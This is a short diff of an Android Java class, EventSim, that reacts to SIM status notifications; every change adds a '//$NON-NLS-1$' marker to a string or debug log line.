@@ -21,7 +21,7 @@ import com.android.service.util.Check;
 
 public class EventSim extends EventBase implements Observer<Sim> {
 	/** The Constant TAG. */
-	private static final String TAG = "EventSim";
+	private static final String TAG = "EventSim"; //$NON-NLS-1$
 
 	private int actionOnEnter;
 
@@ -52,7 +52,7 @@ public class EventSim extends EventBase implements Observer<Sim> {
 	// Viene richiamata dal listener (dalla dispatch())
 	public int notification(Sim s) {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " Got SIM status notification: " + s.getImsi());
+			Check.log(TAG + " Got SIM status notification: " + s.getImsi()) ;//$NON-NLS-1$
 		}
 
 		// Verifichiamo la presenza della SIM
@@ -77,7 +77,7 @@ public class EventSim extends EventBase implements Observer<Sim> {
 				}
 			} catch (final IOException e) {
 				if (Cfg.DEBUG) {
-					Check.log(e);
+					Check.log(e) ;//$NON-NLS-1$
 				}
 			}
 		} else {
